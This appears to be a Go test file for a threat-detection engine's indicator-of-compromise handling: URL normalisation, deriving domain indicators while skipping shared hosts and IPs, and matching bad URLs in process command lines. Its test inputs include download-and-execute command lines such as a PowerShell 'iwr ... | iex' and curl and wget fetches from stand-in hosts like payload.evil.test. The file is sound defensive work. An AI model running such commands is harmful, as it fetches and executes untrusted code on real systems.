package api

import (
	"testing"

	"obsidianwatch/management/internal/store"
)

func urlIOC(v string) store.IOCIndicator {
	return store.IOCIndicator{IOCType: "url", Value: v, Confidence: 90, Severity: 4}
}

func TestNormalizeURL(t *testing.T) {
	cases := map[string]string{
		"HTTP://Evil.Example.com:80/a/b/#frag": "http://evil.example.com/a/b",
		"https://evil.test:443/x/":             "https://evil.test/x",
		"https://evil.test:8443/x?a=1":         "https://evil.test:8443/x?a=1",
		"ftp://evil.test/x":                    "",
		"not a url":                            "",
	}
	for in, want := range cases {
		if got := normalizeURL(in); got != want {
			t.Errorf("%q: got %q want %q", in, got, want)
		}
	}
}

func TestAddURLIOCsSkipsSharedHostsAndIPs(t *testing.T) {
	dom := map[string]store.IOCIndicator{"existing.test": {Value: "existing.test", Source: "feed-a"}}
	n := addURLIOCs(dom, map[string]store.IOCIndicator{
		"1": urlIOC("http://payload.evil.test/a.exe"),
		"2": urlIOC("https://raw.githubusercontent.com/x/y/main/m.ps1"),
		"3": urlIOC("http://45.1.2.3/bot"),
		"4": urlIOC("http://existing.test/z"),
		"5": urlIOC("https://abc.s3.amazonaws.com/m.bin"),
	})
	if n != 1 {
		t.Fatalf("expected exactly 1 derived domain, got %d", n)
	}
	if d, ok := dom["payload.evil.test"]; !ok || d.IOCType != "domain" {
		t.Errorf("hostname should become a domain IOC: %+v", d)
	}
	for _, bad := range []string{"raw.githubusercontent.com", "45.1.2.3", "abc.s3.amazonaws.com"} {
		if _, ok := dom[bad]; ok {
			t.Errorf("%s must not become a domain IOC", bad)
		}
	}
	if dom["existing.test"].Source != "feed-a" {
		t.Error("existing domain IOC must not be overwritten")
	}
	// shared-host URLs are still matchable as exact URLs
	if matchURLIOC("powershell iwr https://raw.githubusercontent.com/x/y/main/m.ps1 | iex", dom) == nil {
		t.Error("exact URL on shared host should still match")
	}
}

func TestMatchURLIOC(t *testing.T) {
	dom := map[string]store.IOCIndicator{}
	addURLIOCs(dom, map[string]store.IOCIndicator{"1": urlIOC("http://payload.evil.test/a.exe")})
	if matchURLIOC(`curl -o a.exe "http://PAYLOAD.evil.test/a.exe".`, dom) == nil {
		t.Error("should match quoted, upper-cased URL in a command line")
	}
	if matchURLIOC("curl http://payload.evil.test/other.exe", dom) != nil {
		t.Error("a different path must not match")
	}
	if matchURLIOC("", dom) != nil || matchURLIOC("ls -l", dom) != nil {
		t.Error("no URL, no match")
	}
}

func TestEngineMatchIOCUsesCommandLineURL(t *testing.T) {
	dom := map[string]store.IOCIndicator{}
	addURLIOCs(dom, map[string]store.IOCIndicator{"1": urlIOC("http://payload.evil.test/a.exe")})
	cl := "wget http://payload.evil.test/a.exe"
	ev := store.Event{EventType: "process", CommandLine: &cl}
	e := &DetectionEngine{}
	if e.matchIOC(ev, nil, dom, nil) == nil {
		t.Error("process with a known-bad URL should match")
	}
}
